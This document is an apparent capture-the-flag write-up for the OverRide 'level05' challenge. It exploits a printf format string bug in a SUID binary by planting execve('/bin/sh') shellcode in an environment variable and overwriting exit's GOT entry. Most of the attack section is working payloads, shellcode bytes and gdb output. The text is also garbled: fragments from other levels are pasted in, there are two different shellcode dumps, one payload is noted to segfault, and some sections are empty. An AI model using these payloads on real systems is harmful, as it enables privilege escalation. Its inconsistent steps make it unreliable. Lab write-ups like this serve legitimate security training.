# Level 5

## Vulnerability



## Context

We find a binary with owner ```level05``` and SUID.
```
level05@OverRide:~$ ls -l
-rwsr-s---+ 1 level06 users 5176 Sep 10  2016 level05
```

When run ...!!!!!
```
level05@OverRide:~$ ./level05
hello
hello
```

## Solution

### main() overview

Let's take a deeper look at the program. See [dissasembly notes](https://github.com/anyashuka/Override/blob/main/level05/Ressources/disassembly_notes.md) for detailed gdb assembly breakdown.

This program is a basic ```tolower()```, which is of little interest to us. 

However we do see a call to ```printf()```, which is vulnerable to string format exploits. 

We also see a call to ```exit()```.

### Build exploit

Let's start by checking our buffer position with a printf() string format exploit.
We can see our buffer "AAAA" in the 10th position on the stack as 61616161.
```
level05@OverRide:~$ python -c 'print "AAAA"+" %x"*12' | ./level05
aaaa 64 f7fcfac0 f7ec3af9 ffffd69f ffffd69e 0 ffffffff ffffd724 f7fdb000 61616161 20782520 25207825
```

Unfortunately, we see the stack is non-executable. 

We can overflow the buffer, but we can't overwrite the EIP with an address (like ```system("/bin/sh")```) in the stack because it won't execute.
```
level05@OverRide:~$ dmesg | grep "Execute Disable"
[    0.000000] NX (Execute Disable) protection: active
```

Instead, we will use [this compact system call opening a shell](http://shell-storm.org/shellcode/files/shellcode-827.php).
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```
We will prefix the shellcode with a 100 byte NOP slide, and then store it all in an environment variable. 
```
level05@OverRide:~$ export SHELLCODE=`python -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
```

Let's find the address of our malicious environment variable. 
```
(gdb) break *main+4
Breakpoint 1 at 0x8048448
(gdb) r
[...]
(gdb) x/200s environ
0xffffd806:	 "/home/users/level05/level05"
0xffffd822:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"
0xffffd8a8:	 "SHELL=/bin/bash"
```
Our malicious shellcode is at ```0xffffd822```. 
Note: we want to move past the first 10 bytes "SHELLCODE=" and into your NOP slide, so let's make the address of our shellcode ```0xffffd822 + A (10 bytes) -> 0xffffd826```.

Unfortunately, ```0xffffd826``` is too large to pass to ```printf()``` in decimal with a ```%d``` format (it overflows maxint).
```
2147483647 <- maximum size of int
4294957094 <- address of shellcode in decimal
```

So our attack takes place in 2 steps:
- malicious environment variable
"NOP slide [100 bytes] + call to open a shell"

- format string attack
"exit GOT address [byte 1] + exit GOT address [byte 2] + shellcode addr [2 bytes] + '%10$hn' + shellcode addr [2 bytes] + '%11$hn'"

```
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55397d%10$hn" + "%10130d%11$hn")'; cat) | ./level05
```


Here is what our string attack should look like:
- pad of arbitrary data [20 bytes]
- puts() GOT address [4 bytes]
- address of m() [4 bytes]
Let's visualize that. 
```
"paddings [20 bytes] + GOT address of puts" + "address of m()"
                  argv[1]                          argv[2]
```
Let's try it out!




0xffffd85c:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f̀1ۉ\330@̀\350\334\377\377\377/bin/sh"
... so 0xffffd85c + A (or 10 in dec) to get past the "SHELLCODE="... which equals 0xffffd866

- overwrite address of exit by address of shellcode
- use %d modifier to write address of shellcode

"exit GOT address" + "4294958369 - 4 bytes" + "%4$n"
(python -c 'print "\xe0\x97\x04\x08" + "%4294958365d" + "%10$n"'; cat) | ./level05

4294958365
2147483647

```
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55397d%10$hn" + "%10130d%11$hn")'; cat) | ./level05
```
---------
./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')

(python -c 'print("\xe0\x97\x04\x08" + "%55397d%10$hn" + "%10130d%11$hn")'; cat) | ./level05 <- segfaults

## Recreate Exploited Binary


